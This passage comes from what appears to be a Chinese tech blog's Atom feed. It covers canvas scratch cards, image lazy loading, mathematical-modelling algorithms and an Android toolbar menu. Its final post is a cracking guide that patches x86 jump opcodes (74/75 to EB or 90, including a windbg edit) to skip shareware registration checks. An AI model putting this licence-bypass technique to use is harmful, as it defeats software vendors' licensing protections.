30,</span><br><span class="line">          fontFamily: &quot;Arial&quot;,</span><br><span class="line">          align: &quot;center&quot;,</span><br><span class="line">          color: &apos;#F60&apos;</span><br><span class="line">      &#125;,</span><br><span class="line">// 图层颜色</span><br><span class="line">      maskColor: &quot;red&quot;,</span><br><span class="line">// 画逼半径</span><br><span class="line">      radius: 20,</span><br><span class="line">// 奖项</span><br><span class="line">      awards: [&quot;一等奖&quot;, &quot;二等奖&quot;, &quot;三等奖&quot;, &quot;谢谢！&quot;]</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  new Scratch(options).init();</span><br></pre>      </td>    </tr>  </table></figure><p><br><br>本文链接： <a href="http://home.meng.uno/articles/9da0578c/">http://home.meng.uno/articles/9da0578c/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      要实现刮奖效果，最重要的是要找到一种方法：当刮开上层的涂层是就能看到下层的结果。而HTML5的canvas API中有一个属性globalCompositeOperation，这个属性有多个值，而实现刮奖效果要用到的值就是destination-out。意思就是：在已有内容和新图形不重叠的地方，已有内容保留，所有其他内容成为透明。这样可能不好理解，后面实现的时候会解释。有了globalCompositeOperation这个属性，实现过程就很简单了。

我们需要有两个层，上面一层肯定是一个canvas元素，因为要能刮开就要用到画布。下面一层其实用什么元素都可以，既然上层用的是canvas元素，
    
    </summary>
    
      <category term="Application" scheme="http://home.meng.uno/categories/Application/"/>
    
    
      <category term="HTML5" scheme="http://home.meng.uno/tags/HTML5/"/>
    
      <category term="canvas" scheme="http://home.meng.uno/tags/canvas/"/>
    
      <category term="刮奖效果" scheme="http://home.meng.uno/tags/%E5%88%AE%E5%A5%96%E6%95%88%E6%9E%9C/"/>
    
  </entry>
  
  <entry>
    <title>加载图片</title>
    <link href="http://home.meng.uno/articles/bc3de361/"/>
    <id>http://home.meng.uno/articles/bc3de361/</id>
    <published>2015-04-28T15:54:00.000Z</published>
    <updated>2020-12-02T01:48:45.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p><code>&lt;img src=&quot;xx.jpg&quot; /&gt;</code>是每个前端开发都会的技能。然而，如果你想做到极致，事情还没有这么简单。</p></blockquote><h1>第一步：滚屏加载</h1><p>这是最容易想到的点，也是一开始就准备做的。</p><p>随web体验的进步，滚屏加载代替分页加载的情形越来越多。也就是先预留图片位置，而不去加载图片，直到这个预留区域滚动到屏幕中，用户能看见了，才去加载图片。如此一来，有“按需加载”的意味，由于图片加载延后，不抢占带宽，在打开页面的首屏会快很多。我们称之为“懒加载(lazyload)”。</p><p>其实现也很简单，在html里面写<code>&lt;img lazy-src=&quot;xx.jpg&quot; /&gt;</code>，然后用js去判断这个节点是否出现在屏幕中，如果是，则取出<code>lazy-src</code>属性，赋值成<code>&lt;img lazy-src=&quot;xx.jpg&quot; src=&quot;xx.jpg&quot;/&gt;</code>，触发此节点onload，这就实现最简单的滚屏加载了。</p><h1>第二步：特殊状态处理</h1><p>特殊状态有两种：加载中与加载失败。这两种情况的处理逻辑相类似，拿加载中的逻辑做例子。</p><p>图片触发加载，到图片加载完成（或失败）之间，肯定会有一段时间。不做处理的话，用户在等待的过程中，就只能看到空白的区域，非常的奇怪。在低网速，以及用户非常快的拉滚动条的情形下，这种现象将更加明显。</p><p>那么在触发onload之前，就需要补一些逻辑，展示对应的loading图。 将需要处理的img节点作为参数，调用tempImg函数，克隆一个节点强行插在img之前，用于loading中的展示。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>      </td>      <td class="code">        <pre><span class="line">var tempImg = function(target)&#123;</span><br><span class="line">    var w = target.width();</span><br><span class="line">    var h = target.height();</span><br><span class="line">    var tempDom = target.clone().addClass(&quot;lazy-loding&quot;).insertBefore(target);</span><br><span class="line"></span><br><span class="line">    if(w/h == 1)&#123;</span><br><span class="line">        tempDom[0].src = &quot;http://9.url.cn/edu/img/img-loading.png&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        tempDom[0].src = &quot;http://9.url.cn/edu/img/img-loading2.png&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    target.hide();</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h1>第三步：上报监控</h1><p>这一步在大型前端项目中非常重要，也是经常被忽略的地方。尽管需要简易的后台配合，但不算麻烦的上报监控，能让产品更加稳定和健壮。</p><p>我在两个地方用到了上报。其一是图片加载失败，触发<code>onerror</code>时，这样一来我们能知道每天图片拉取失败的量；其二是图片加载的时间，能够帮助我们分析cdn服务是否异常，分析全国慢速用户比例等等。</p><p>而所谓的上报其实就是一个http请求，我会大概把这些信息带上：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line">   log(&#123;</span><br><span class="line">&apos;type&apos;: &apos;error&apos;,</span><br><span class="line">&apos;msg&apos;: &apos;lazyload拉取图片失败上报 &apos;,</span><br><span class="line">&apos;url&apos;: window.location.href,</span><br><span class="line">&apos;pid&apos;: 414342  //产品对应的id</span><br><span class="line">&#125;);</span><br></pre>      </td>    </tr>  </table></figure><h1>第四步：居中截取</h1><p>这是前端无可避免的一个问题，先来说下此问题的背景。</p><p>由于我们是先用一个空白的img标签占位，再去加载图片，如果图片的高度特别长（比如新浪长微博），加载完成时就会撑开节点，引起滚动条的跳动。由于移动端屏幕较PC窄，一个跳动就可能让你找不到前一秒正在浏览的内容，这种体验尤其严重。在移动端的web设计中，可以看到许多知名互联网公司的产品，也经常忽略这一点。</p><p>因此我们可以限定占位区域的size，以此区域来做居中截取。当占位区域与图片最终展示同宽同高时，就不会引起跳动，而且也保持了视觉的一致性。</p><p>其原理如下，先判断是竖向长型图，还是横向长型图，根据不同的情况，优先让宽或高填充满占位区域，然后通过不同的负margin去实现居中。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>      </td>      <td class="code">        <pre><span class="line">var calSize = function($img) &#123;</span><br><span class="line">    var w = $img.width(), h = $img.height(), width = size[0], height = size[1];</span><br><span class="line">    if(w+h == 0) return;</span><br><span class="line"></span><br><span class="line">    //如果是长型图，优先适配宽度，高度居中截取</span><br><span class="line">    if(w/h &gt; width/height)&#123;</span><br><span class="line">        var newWidth = height * w / h;</span><br><span class="line">        var margin = (width - newWidth)/2;</span><br><span class="line">        $img.height(height).css(&#123;&quot;margin-left&quot;: margin&#125;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        var newHeight = width * h / w;</span><br><span class="line">        var margin = (height - newHeight)/2;</span><br><span class="line">        $img.width(width).css(&#123;&quot;margin-top&quot;: margin&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h1>第五步：支持webp</h1><p>webp格式图片是google开发的一种旨在加快图片加载速度的图片格式，压缩提交大概只有jpg的2/3。随chrome的比例越来越多，其实让更多用户体验到webp也是一件好事。</p><p>那么问题来了，怎么去判断用户的浏览器是否支持webp呢？ 根据ua去判断是个好方法，但不太靠谱，因为chrome中其实也有设置，让它不能去支持webp，而且webkit本身就开源，会衍生出很多你不知道名字的浏览器。</p><p>最终我使用的是特性检测：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>      </td>      <td class="code">        <pre><span class="line">if(!supportedWebPIsLoading) &#123;</span><br><span class="line">    supportedWebPIsLoading = true;</span><br><span class="line">    var images = &#123;</span><br><span class="line">        basic: &quot;data:image/webp;base64,UklGRjIAAABXRUJQVlA4ICYAAACyAgCdASoCAAEALmk0mk0iIiIiIgBoSygABc6zbAAA/v56QAAAAA==&quot;</span><br><span class="line">    &#125;, $img = new Image();</span><br><span class="line">    $img.onload = function () &#123;</span><br><span class="line">        supportedWebPIsLoading = false;</span><br><span class="line">        $.cookie.set(&quot;iswebp&quot; , +supportedWebP);</span><br><span class="line">    &#125;;</span><br><span class="line">    $img.onerror = function () &#123;</span><br><span class="line">        supportedWebP = false;</span><br><span class="line">        supportedWebPIsLoading = false;</span><br><span class="line">        $.cookie.set(&quot;iswebp&quot; , +supportedWebP);</span><br><span class="line">    &#125;;</span><br><span class="line">    $img.src = images.basic;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>我们会让浏览器试着加载一张非常小的base64格式的webp图片，如果能够正常加载，说明是支持webp的。</p><p>并且，会把测试记录在cookie里，所以第二次直接从cookie里读结果，基本不会影响性能。完成了最重要的检查，我们就可以放心让服务器返回不同格式的图片了。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/bc3de361/">http://home.meng.uno/articles/bc3de361/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      &lt;img src=&quot;xx.jpg&quot; /&gt;是每个前端开发都会的技能。然而，如果你想做到极致，事情还没有这么简单。

第一步：滚屏加载
这是最容易想到的点，也是一开始就准备做的。

随web体验的进步，滚屏加载代替分页加载的情形越来越多。也就是先预留图片位置，而不去加载图片，直到这个预留区域滚动到屏幕中，用户能看见了，才去加载图片。如此一来，有“按需加载”的意味，由于图片加载延后，不抢占带宽，在打开页面的首屏会快很多。我们称之为“懒加载(lazyload)”。

其实现也很简单，在html里面写&lt;img lazy-src=&quot;xx.jpg&quot; /&gt;，然后用js去判断这个节点是否出现在屏幕中，如果是，则
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="js" scheme="http://home.meng.uno/tags/js/"/>
    
      <category term="图片加载" scheme="http://home.meng.uno/tags/%E5%9B%BE%E7%89%87%E5%8A%A0%E8%BD%BD/"/>
    
  </entry>
  
  <entry>
    <title>数学建模常用的十大算法</title>
    <link href="http://home.meng.uno/articles/dd0e4c80/"/>
    <id>http://home.meng.uno/articles/dd0e4c80/</id>
    <published>2015-02-03T12:03:33.000Z</published>
    <updated>2020-12-02T01:42:27.000Z</updated>
    
    <content type="html"><![CDATA[<h1>概述</h1><h2 id="蒙特卡罗算法">蒙特卡罗算法</h2><p>该算法又称随机性模拟算法，是通过计算机仿真来解决问题的算法，同时可以通过模拟来检验自己模型的正确性，几乎是比赛时必用的方法。</p><h2 id="数据拟合-参数估计-插值等数据处理算法">数据拟合、参数估计、插值等数据处理算法</h2><p>比赛中通常会遇到大量的数据需要处理，而处理数据的关键就在于这些算法，通常使用MATLAB 作为工具。</p><h2 id="线性规划-整数规划-多元规划-二次规划等规划类算法">线性规划、整数规划、多元规划、二次规划等规划类算法</h2><p>建模竞赛大多数问题属于最优化问题，很多时候这些问题可以用数学规划算法来描述，通常使用Lindo、Lingo 软件求解。</p><h2 id="图论算法">图论算法</h2><p>这类算法可以分为很多种，包括最短路、网络流、二分图等算法，涉及到图论的问题可以用这些方法解决，需要认真准备。</p><h2 id="动态规划-回溯搜索-分治算法-分支定界等计算机算法">动态规划、回溯搜索、分治算法、分支定界等计算机算法</h2><p>这些算法是算法设计中比较常用的方法，竞赛中很多场合会用到。</p><h2 id="最优化理论的三大非经典算法：模拟退火算法-神经网络算法-遗传算法">最优化理论的三大非经典算法：模拟退火算法、神经网络算法、遗传算法</h2><p>这些问题是用来解决一些较困难的最优化问题的，对于有些问题非常有帮助，但是算法的实现比较困难，需慎重使用。</p><h2 id="网格算法和穷举法">网格算法和穷举法</h2><p>两者都是暴力搜索最优点的算法，在很多竞赛题中有应用，当重点讨论模型本身而轻视算法的时候，可以使用这种暴力方案，最好使用一些高级语言作为编程工具。</p><h2 id="一些连续数据离散化方法">一些连续数据离散化方法</h2><p>很多问题都是实际来的，数据可以是连续的，而计算机只能处理离散的数据，因此将其离散化后进行差分代替微分、求和代替积分等思想是非常重要的。</p><h2 id="数值分析算法">数值分析算法</h2><p>如果在比赛中采用高级语言进行编程的话，那些数值分析中常用的算法比如方程组求解、矩阵运算、函数积分等算法就需要额外编写库函数进行调用。</p><h2 id="图象处理算法">图象处理算法</h2><p>赛题中有一类问题与图形有关，即使问题与图形无关，论文中也会需要图片来说明问题，这些图形如何展示以及如何处理就是需要解决的问题，通常使用MATLAB 进行处理。</p><p>以下将结合历年的竞赛题，对这十类算法进行详细地说明。</p><h1>十类算法的详细说明</h1><h2 id="蒙特卡罗算法-v2">蒙特卡罗算法</h2><p>大多数建模赛题中都离不开计算机仿真，随机性模拟是非常常见的算法之一。举个例子就是97 年的A 题，每个零件都有自己的标定值，也都有自己的容差等级，而求解最优的组合方案将要面对着的是一个极其复杂的公式和108 种容差选取方案，根本不可能去求解析解，那如何去找到最优的方案呢？随机性模拟搜索最优方案就是其中的一种方法，在每个零件可行的区间中按照正态分布随机的选取一个标定值和选取一个容差值作为一种方案，然后通过蒙特卡罗算法仿真出大量的方案，从中选取一个最佳的。另一个例子就是去年的彩票第二问，要求设计一种更好的方案，首先方案的优劣取决于很多复杂的因素，同样不可能刻画出一个模型进行求解，只能靠随机仿真模拟。</p><h2 id="数据拟合-参数估计-插值等算法">数据拟合、参数估计、插值等算法</h2><p>数据拟合在很多赛题中有应用，与图形处理有关的问题很多与拟合有关系，一个例子就是98 年美国赛A 题，生物组织切片的三维插值处理，94 年A 题逢山开路，山体海拔高度的插值计算，还有吵的沸沸扬扬可能会考的“非典”问题也要用到数据拟合算法，观察数据的走向进行处理。此类问题在MATLAB中有很多现成的函数可以调用，熟悉MATLAB，这些方法都能游刃有余的用好。</p><h2 id="规划类问题算法">规划类问题算法</h2><p>竞赛中很多问题都和数学规划有关，可以说不少的模型都可以归结为一组不等式作为约束条件、几个函数表达式作为目标函数的问题，遇到这类问题，求解就是关键了，比如98年B 题，用很多不等式完全可以把问题刻画清楚，因此列举出规划后用Lindo、Lingo 等软件来进行解决比较方便，所以还需要熟悉这两个软件。</p><h2 id="图论问题">图论问题</h2><p>98年B题、00年B题、95年锁具装箱等问题体现了图论问题的重要性，这类问题算法有很多，包括：Dijkstra、Floyd、Prim、Bellman-Ford，最大流，二分匹配等问题。每一个算法都应该实现一遍，否则到比赛时再写就晚了。</p><h2 id="计算机算法设计中的问题">计算机算法设计中的问题</h2><p>计算机算法设计包括很多内容：动态规划、回溯搜索、分治算法、分支定界。比如92 年B 题用分枝定界法，97 年B 题是典型的动态规划问题，此外98 年B 题体现了分治算法。这方面问题和ACM 程序设计竞赛中的问题类似，推荐看一下《计算机算法设计与分析》（电子工业出版社）等与计算机算法有关的书。</p><h2 id="最优化理论的三大非经典算法">最优化理论的三大非经典算法</h2><p>这十几年来最优化理论有了飞速发展，模拟退火法、神经网络、遗传算法这三类算法发展很快。近几年的赛题越来越复杂，很多问题没有什么很好的模型可以借鉴，于是这三类算法很多时候可以派上用场，比如：97 年A 题的模拟退火算法，00 年B 题的神经网络分类算法，象01 年B 题这种难题也可以使用神经网络，还有美国竞赛89 年A 题也和BP 算法有关系，当时是86 年刚提出BP 算法，89 年就考了，说明赛题可能是当今前沿科技的抽象体现。03 年B 题伽马刀问题也是目前研究的课题，目前算法最佳的是遗传算法。</p><h2 id="网格算法和穷举算法">网格算法和穷举算法</h2><p>网格算法和穷举法一样，只是网格法是连续问题的穷举。比如要求在N 个变量情况下的最优化问题，那么对这些变量可取的空间进行采点，比如在[a; b] 区间内取M +1 个点，就是a; a+(b-a)/M; a+2 (b-a)/M; …… ; b 那么这样循环就需要进行(M + 1)N 次运算，所以计算量很大。比如97 年A 题、99 年B 题都可以用网格法搜索，这种方法最好在运算速度较快的计算机中进行，还有要用高级语言来做，最好不要用MATLAB 做网格，否则会算很久的。穷举法大家都熟悉，就不说了。</p><h2 id="一些连续数据离散化的方法">一些连续数据离散化的方法</h2><p>大部分物理问题的编程解决，都和这种方法有一定的联系。物理问题是反映我们生活在一个连续的世界中，计算机只能处理离散的量，所以需要对连续量进行离散处理。这种方法应用很广，而且和上面的很多算法有关。事实上，网格算法、蒙特卡罗算法、模拟退火都用了这个思想。</p><h2 id="数值分析算法-v2">数值分析算法</h2><p>这类算法是针对高级语言而专门设的，如果你用的是MATLAB、Mathematica，大可不必准备，因为象数值分析中有很多函数一般的数学软件是具备的。</p><h2 id="图象处理算法-v2">图象处理算法</h2><p>01 年A 题中需要你会读BMP 图象、美国赛98 年A 题需要你知道三维插值计算，03 年B 题要求更高，不但需要编程计算还要进行处理，而数模论文中也有很多图片需要展示，因此图象处理就是关键。做好这类问题，重要的是把MATLAB 学好，特别是图象处理的部分。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/dd0e4c80/">http://home.meng.uno/articles/dd0e4c80/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      概述
蒙特卡罗算法
该算法又称随机性模拟算法，是通过计算机仿真来解决问题的算法，同时可以通过模拟来检验自己模型的正确性，几乎是比赛时必用的方法。

数据拟合、参数估计、插值等数据处理算法
比赛中通常会遇到大量的数据需要处理，而处理数据的关键就在于这些算法，通常使用MATLAB 作为工具。

线性规划、整数规划、多元规划、二次规划等规划类算法
建模竞赛大多数问题属于最优化问题，很多时候这些问题可以用数学规划算法来描述，通常使用Lindo、Lingo 软件求解。

图论算法
这类算法可以分为很多种，包括最短路、网络流、二分图等算法，涉及到图论的问题可以用这些方法解决，需要认真准备。

动态规划、回
    
    </summary>
    
      <category term="Mathematical Modeling" scheme="http://home.meng.uno/categories/Mathematical-Modeling/"/>
    
    
      <category term="算法" scheme="http://home.meng.uno/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="数学建模" scheme="http://home.meng.uno/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
    
  </entry>
  
  <entry>
    <title>Android 自定义toolBar上的 action item</title>
    <link href="http://home.meng.uno/articles/bc6e8459/"/>
    <id>http://home.meng.uno/articles/bc6e8459/</id>
    <published>2015-01-19T03:48:46.000Z</published>
    <updated>2020-12-02T01:40:47.000Z</updated>
    
    <content type="html"><![CDATA[<h1>自定义的view，action_view_auto_like.xml</h1><figure class="highlight xml">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">FrameLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ImageButton</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/action_auto_like_button"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"70dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"30dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:scaleType</span>=<span class="string">"centerInside"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">"@android:color/transparent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:src</span>=<span class="string">"@drawable/btn_nav_autoliker"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ImageButton</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">FrameLayout</span>&gt;</span></span><br></pre>      </td>    </tr>  </table></figure><h1>自定义的menu，menu_tinder_liker.xml</h1><figure class="highlight xml">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="tag">&lt;<span class="name">menu</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tinder</span>=<span class="string">"http://schemas.android.com/apk/res-auto"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/action_auto"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:actionLayout</span>=<span class="string">"@layout/action_view_auto_like"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">"@drawable/btn_nav_autoliker"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:orderInCategory</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:title</span>=<span class="string">"@string/action_auto_like"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">tinder:actionLayout</span>=<span class="string">"@layout/action_view_auto_like"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">tinder:showAsAction</span>=<span class="string">"always"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">menu</span>&gt;</span></span><br></pre>      </td>    </tr>  </table></figure><h1>在fragment 中配置</h1><p>现在<code>onCreateView</code>中加上<code>setHasOptionsMenu(true);</code>，让系统在fragment中初始化menu。</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu, MenuInflater inflater)</span> </span>&#123;</span><br><span class="line">    inflater.inflate(R.menu.menu_tinder_like, menu);</span><br><span class="line">    MenuItem searchItem = menu.findItem(R.id.action_auto);</span><br><span class="line">    FrameLayout layout = (FrameLayout) MenuItemCompat</span><br><span class="line">            .getActionView(searchItem);</span><br><span class="line">    layout.findViewById(R.id.action_auto_like_button)</span><br><span class="line">            .setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">super</span>.onCreateOptionsMenu(menu, inflater);</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>然后在<code>onClick</code>中加入你的逻辑。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/bc6e8459/">http://home.meng.uno/articles/bc6e8459/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      自定义的view，action_view_auto_like.xml
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15


&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;FrameLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
    android:layout_width=&quot;wrap_content&quot;
    android:layout_height=&quot;wrap_content&quot;&gt;

    &lt;ImageButton
        android:
    
    </summary>
    
      <category term="Application" scheme="http://home.meng.uno/categories/Application/"/>
    
    
      <category term="Android" scheme="http://home.meng.uno/tags/Android/"/>
    
      <category term="menu" scheme="http://home.meng.uno/tags/menu/"/>
    
      <category term="toolbar" scheme="http://home.meng.uno/tags/toolbar/"/>
    
  </entry>
  
  <entry>
    <title>破解时常用的汇编命令</title>
    <link href="http://home.meng.uno/articles/36aa5187/"/>
    <id>http://home.meng.uno/articles/36aa5187/</id>
    <published>2014-11-03T12:10:37.000Z</published>
    <updated>2020-12-02T01:41:05.000Z</updated>
    
    <content type="html"><![CDATA[<h1>概述</h1><p>基本上多数破解的思路是一样的，就是将本来判断为true的时候干的事情改为逻辑值为false就做，因此常常需要替换一些汇编命令：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>      </td>      <td class="code">        <pre><span class="line">cmp <span class="selector-tag">a</span>,<span class="selector-tag">b</span> 比较a与b</span><br><span class="line">mov <span class="selector-tag">a</span>,<span class="selector-tag">b</span> 把b的值送给a</span><br><span class="line">ret 返回主程序</span><br><span class="line">nop 无作用,英文“no operation”的简写，意思是“do nothing”(机器码<span class="number">90</span>)</span><br><span class="line">call 调用子程序</span><br><span class="line">je 或jz 若相等则跳(机器码<span class="number">74</span> 或<span class="number">0</span>F84)</span><br><span class="line">jne或jnz 若不相等则跳(机器码<span class="number">75</span>或<span class="number">0</span>F85)</span><br><span class="line">jmp 无条件跳(机器码EB)</span><br><span class="line">jb 若小于则跳</span><br><span class="line">ja 若大于则跳</span><br><span class="line">jg 若大于则跳</span><br><span class="line">jge 若大于等于则跳</span><br><span class="line">jl 若小于则跳</span><br><span class="line">jle 若小于等于则跳</span><br><span class="line">pop 出栈</span><br><span class="line">push 压栈</span><br></pre>      </td>    </tr>  </table></figure><h1>常见修改(机器码)</h1><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">74=&gt;75 74=&gt;90 74=&gt;EB</span><br><span class="line">75=&gt;74 75=&gt;90 75=&gt;EB</span><br></pre>      </td>    </tr>  </table></figure><p>jnz -&gt; nop</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">75-&gt;90(相应的机器码修改)</span><br></pre>      </td>    </tr>  </table></figure><p>jnz -&gt; jmp</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">75 -&gt; EB(相应的机器码修改)</span><br></pre>      </td>    </tr>  </table></figure><p>jnz -&gt; jz</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">75-&gt;74 (正常) </span><br><span class="line">0F 85 -&gt; 0F 84(特殊情况下,有时,相应的机器码修改)</span><br></pre>      </td>    </tr>  </table></figure><h1>两种不同情况的不同修改方法</h1><h2 id="修改为jmp">修改为jmp</h2><p>je(jne,jz,jnz) =&gt;jmp相应的机器码EB （出错信息向上找到的第一个跳转）jmp的作用是绝对跳，无条件跳，从而跳过下面的出错信息。</p><p>出错信息，例如：注册码不对，sorry,未注册版不能…，“Function Not Avaible in Demo” 或 “Command Not Avaible” 或 &quot;Can’t save in Shareware/Demo&quot;等 （我们希望把它跳过，不让它出现）。</p><h2 id="修改为nop">修改为nop</h2><p>je(jne,jz,jnz) =&gt;nop相应的机器码90 （正确信息向上找到的第一个跳转） nop的作用是抹掉这个跳转，使这个跳转无效，失去作用，从而使程序顺利来到紧跟其后的正确信息处。</p><p>正确信息，例如：注册成功，谢谢您的支持等（我们希望它不被跳过，让它出现，程序一定要顺利来到这里）。</p><p>出错信息（我们希望不要跳到这里，不让它出现）它们在存贮器和寄存器、寄存器和输入输出端口之间传送数据。</p><p>例如使用windbg时候：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">0:000&gt; dd 0c366b28 l4</span><br><span class="line">0c366b28  7e830c74 940f0108 c0b60fc0 01b805eb</span><br></pre>      </td>    </tr>  </table></figure><p>执行<code>ed 0c366b28 7e830c75</code></p><p>修改为:</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">0:000&gt; dd 0c366b28 l4</span><br><span class="line">0c366b28  7e830c75 940f0108 c0b60fc0 01b805eb</span><br></pre>      </td>    </tr>  </table></figure><p><br><br>本文链接： <a href="http://home.meng.uno/articles/36aa5187/">http://home.meng.uno/articles/36aa5187/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      概述
基本上多数破解的思路是一样的，就是将本来判断为true的时候干的事情改为逻辑值为false就做，因此常常需要替换一些汇编命令：

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16


cmp a,b 比较a与b
mov a,b 把b的值送给a
ret 返回主程序
nop 无作用,英文“no operation”的简写，意思是“do nothing”(机器码90)
call 调用子程序
